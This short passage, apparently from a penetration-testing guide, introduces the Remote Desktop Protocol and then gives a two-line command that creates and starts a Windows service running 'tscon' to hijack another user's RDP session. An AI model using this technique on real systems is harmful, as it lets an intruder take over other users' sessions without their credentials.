### 1 - Introduction 

Remote Desktop Protocol (RDP) is a protocol that allows a user to connect to a server running RDS. Clients exist for almost all versions of Windows, and for other operating systems, such as GNU/Linux. The server listens by default on TCP port 3389.

```powershell
sc create sesshijack binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#0"
net start sesshijack
```
